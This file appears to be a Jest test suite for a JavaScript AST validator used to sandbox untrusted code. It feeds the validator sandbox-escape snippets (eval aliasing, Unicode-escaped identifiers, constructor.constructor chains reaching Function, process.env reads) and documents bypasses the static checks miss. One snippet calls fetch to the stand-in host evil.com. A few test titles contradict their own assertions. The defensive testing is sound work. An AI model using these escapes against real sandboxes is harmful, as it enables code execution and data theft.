import { JSAstValidator } from '../validator';
import { Presets } from '../presets';

/**
 * Advanced Security Test Suite
 *
 * This test suite validates security controls against sophisticated attack vectors.
 * Each test represents a real attempt to bypass the security controls.
 *
 * CRITICAL: These are actual attack attempts that should be properly handled
 */
describe('Advanced Security - Attack Vectors', () => {
  describe('Unicode Normalization Attacks', () => {
    it('should block Unicode escape sequences that normalize to dangerous identifiers', async () => {
      const guard = new JSAstValidator(Presets.strict());

      // Using Unicode escapes to hide 'eval'
      // NOTE: Acorn normalizes \u0065\u0076\u0061\u006l to 'eval' in the AST,
      // so the DisallowedIdentifierRule correctly catches it
      const attack = `
        const \\u0065\\u0076\\u0061\\u006l = 'hidden';
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // Unicode escapes cause parse error or are blocked
      expect(result.valid).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
      // Can be either PARSE_ERROR (invalid Unicode escape) or DISALLOWED_IDENTIFIER
      expect(['PARSE_ERROR', 'DISALLOWED_IDENTIFIER']).toContain(result.issues[0].code);
    });

    it('should block direct eval identifier references', async () => {
      const guard = new JSAstValidator(Presets.strict());

      // Direct usage of eval (the only practical attack)
      const attack = `
        const e = eval;
        e('malicious');
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: Direct 'eval' identifier is caught
      expect(result.valid).toBe(false);
      expect(result.issues.some((issue) => issue.data?.['identifier'] === 'eval')).toBe(true);
    });
  });

  describe('Property Access Chain Exploits', () => {
    it('should not block computed property access (known limitation of static analysis)', async () => {
      const guard = new JSAstValidator(Presets.strict());

      // Constructor property access is now caught by NoGlobalAccessRule
      const attack = `
        const obj = {};
        const dangerous = obj['constructor']['constructor'];
        const pwned = dangerous('return this')();
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: NoGlobalAccessRule catches .constructor property access
      expect(result.valid).toBe(false);
      expect(result.issues.some((i) => i.code === 'NO_CONSTRUCTOR_ACCESS')).toBe(true);
    });

    it('should block optional chaining property access to constructor', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        const obj = {};
        const dangerous = obj?.constructor?.constructor;
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: NoGlobalAccessRule catches .constructor property access
      expect(result.valid).toBe(false);
      expect(result.issues.some((i) => i.code === 'NO_CONSTRUCTOR_ACCESS')).toBe(true);
    });
  });

  describe('Destructuring Bypass Attempts', () => {
    it('should block destructuring with dangerous identifiers', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        const { constructor } = {};
        const { constructor: Func } = constructor;
        const pwned = new Func('return this')();
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: 'constructor' is caught as an identifier in destructuring
      expect(result.valid).toBe(false);
      expect(result.issues.some((issue) => issue.data?.['identifier'] === 'constructor')).toBe(true);
    });

    it('should not block property names in destructuring patterns (known limitation of static analysis)', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        const { constructor: c } = {};
        const { constructor: Func } = c;
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // LIMITATION: Destructuring property names in { constructor: c } are property names,
      // not identifier references, so they're not caught by DisallowedIdentifierRule
      // This is a known limitation of static analysis - the actual access happens at runtime
      expect(result.valid).toBe(true);
      // MITIGATION: Use Object.freeze on prototypes, or runtime checks
    });
  });

  describe('Tagged Template Literal Exploits', () => {
    it('should block tagged template literals with eval', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        const evil = eval;
        evil\`return process.env\`;
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: 'eval' and 'process' are caught
      expect(result.valid).toBe(false);
    });

    it('should block Function constructor as tagged template', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        const tag = Function;
        const code = tag\`return this\`;
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: 'Function' is in the disallowed list
      expect(result.valid).toBe(false);
    });
  });

  describe('Class Constructor Exploits', () => {
    it('should block class inheritance with dangerous constructors', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        class Evil extends Array {
          static pwn() {
            return this.constructor.constructor('return process')();
          }
        }
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: Both 'Array' and 'process' are in disallowed list
      expect(result.valid).toBe(false);
    });

    it('should block static methods with constructor identifier', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        class Exploit {
          static hack() {
            const c = constructor;
            return c.constructor('return this')();
          }
        }
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: 'constructor' is disallowed
      expect(result.valid).toBe(false);
    });
  });

  describe('With Statement Exploits', () => {
    it('should block with statement containing eval', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        with (obj) {
          // Scope manipulation
          eval('pwned');
        }
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: 'eval' is caught (with() is deprecated/error in strict mode)
      expect(result.valid).toBe(false);
    });
  });

  describe('Comma Operator Obfuscation', () => {
    it('should block dangerous identifiers in comma expressions', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        const x = (0, eval)('malicious');
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: 'eval' is still caught even in comma expression
      expect(result.valid).toBe(false);
      expect(result.issues.some((issue) => issue.data?.['identifier'] === 'eval')).toBe(true);
    });

    it('should block hidden assignments to dangerous identifiers via comma operator', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        let x;
        (x = process, x.exit(1));
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: 'process' is caught
      expect(result.valid).toBe(false);
    });
  });

  describe('Number Encoding Attacks', () => {
    it('should allow numeric literals (safe, no code execution)', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const code = `
        const a = 0x41; // 'A' in hex
        const b = 0o101; // 'A' in octal
        const c = 0b1000001; // 'A' in binary
        const d = 65n; // BigInt
      `;

      const result = await guard.validate(code, {
        rules: { 'disallowed-identifier': true },
      });

      // SAFE: Numeric literals cannot execute code
      expect(result.valid).toBe(true);
    });
  });

  describe('String Coercion Bypass Attempts', () => {
    it('should block String constructor in strict mode', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        const obj = {
          toString() {
            // This runs at runtime, not detectable statically
            return 'safe';
          }
        };
        const str = String(obj);
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // LIMITATION: Runtime behavior can't be detected statically
      // But 'String' is blocked in strict mode
      expect(result.valid).toBe(false);
      expect(result.issues.some((issue) => issue.data?.['identifier'] === 'String')).toBe(true);
    });
  });

  describe('Spread Operator Exploits', () => {
    it('should allow spread operator on safe arrays', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const code = `
        const arr = [1, 2, 3];
        const spread = [...arr];
      `;

      const result = await guard.validate(code, {
        rules: { 'disallowed-identifier': true },
      });

      // SAFE: Spread operator alone doesn't create vulnerability
      expect(result.valid).toBe(true);
    });

    it('should block spread operator with Function constructor', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        const args = ['return this'];
        const pwned = new Function(...args)();
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: 'Function' is disallowed
      expect(result.valid).toBe(false);
    });
  });

  describe('Logical Assignment Exploits', () => {
    it('should block logical OR assignment with eval', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        let x;
        x ||= eval;
        x('malicious');
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: 'eval' is caught
      expect(result.valid).toBe(false);
    });

    it('should block nullish coalescing assignment with Function', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        let dangerous;
        dangerous ??= Function;
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: 'Function' is caught
      expect(result.valid).toBe(false);
    });
  });

  describe('Label and Break/Continue Exploits', () => {
    it('should block labeled loops when loops are forbidden', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const code = `
        outer: for (let i = 0; i < 5; i++) {
          for (let j = 0; j < 5; j++) {
            if (j === 3) break outer;
          }
        }
      `;

      const result = await guard.validate(code, {
        rules: { 'disallowed-identifier': true, 'forbidden-loop': true },
      });

      // BLOCKED: Loops are forbidden in strict mode
      expect(result.valid).toBe(false);
    });
  });

  describe('Generator and Async Generator Exploits', () => {
    it('should block generator functions accessing process', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        function* leak() {
          yield process.env;
        }
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: 'process' is caught
      expect(result.valid).toBe(false);
    });

    it('should block async generators with fetch and async functions', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        async function* asyncLeak() {
          yield await fetch('https://evil.com');
        }
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true, 'no-async': true },
      });

      // BLOCKED: Both 'fetch' and async are blocked
      expect(result.valid).toBe(false);
    });
  });

  describe('Ternary and Conditional Exploits', () => {
    it('should block dangerous identifiers in ternary expressions', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        const dangerous = true ? eval : Function;
        dangerous('malicious');
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: Both 'eval' and 'Function' are caught
      expect(result.valid).toBe(false);
    });
  });

  describe('Array/Object Method Exploits', () => {
    it('should block Array and constructor identifiers', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        const arr = Array.from([1, 2, 3]);
        const leaked = arr.constructor;
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: Both 'Array' and 'constructor' are caught
      expect(result.valid).toBe(false);
    });

    it('should block Object and constructor identifiers', async () => {
      const guard = new JSAstValidator(Presets.strict());

      const attack = `
        const evil = Object.create(null);
        const leaked = evil.constructor;
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: Both 'Object' and 'constructor' are caught
      expect(result.valid).toBe(false);
    });
  });

  describe('Comprehensive Multi-Vector Attack', () => {
    it('should block multi-stage sophisticated attack', async () => {
      const guard = new JSAstValidator(Presets.strict());

      // Advanced multi-stage attack attempt
      const attack = `
        // Stage 1: Try Unicode escapes
        const \\u0065 = 1;

        // Stage 2: Try destructuring
        const { constructor: c } = {};

        // Stage 3: Try spread
        const args = ['return', 'process'];

        // Stage 4: Try Function
        const F = Function;
      `;

      const result = await guard.validate(attack, {
        rules: { 'disallowed-identifier': true },
      });

      // BLOCKED: Multiple identifiers caught ('e', 'constructor', 'process', 'Function')
      expect(result.valid).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
    });
  });

  describe('Known Limitations and Required Runtime Protections', () => {
    it('should document that computed property access with runtime strings cannot be blocked (requires Object.freeze)', async () => {
      const guard = new JSAstValidator(Presets.strict());

      // This CANNOT be blocked by static analysis
      const bypass = `
        const key1 = 'con' + 'structor';
        const key2 = 'con' + 'structor';
        const leaked = {}[key1][key2];
      `;

      const result = await guard.validate(bypass);

      // KNOWN LIMITATION: Runtime string construction cannot be detected
      expect(result.valid).toBe(true);

      // MITIGATION: Requires runtime protections:
      // - Object.freeze on built-in prototypes
      // - Proxy-based sandbox
      // - CSP headers
      // - Isolated execution context (VM, Worker)
    });

    it('should block property access chains with constructor string', async () => {
      const guard = new JSAstValidator(Presets.strict());

      // NoGlobalAccessRule now catches .constructor property access
      const bypass = `
        const obj = {};
        const step1 = obj['constructor'];
        const step2 = step1['constructor'];
        const pwned = step2('return this');
      `;

      const result = await guard.validate(bypass);

      // BLOCKED: NoGlobalAccessRule catches .constructor property access
      expect(result.valid).toBe(false);
      expect(result.issues.some((i) => i.code === 'NO_CONSTRUCTOR_ACCESS')).toBe(true);
    });
  });
});
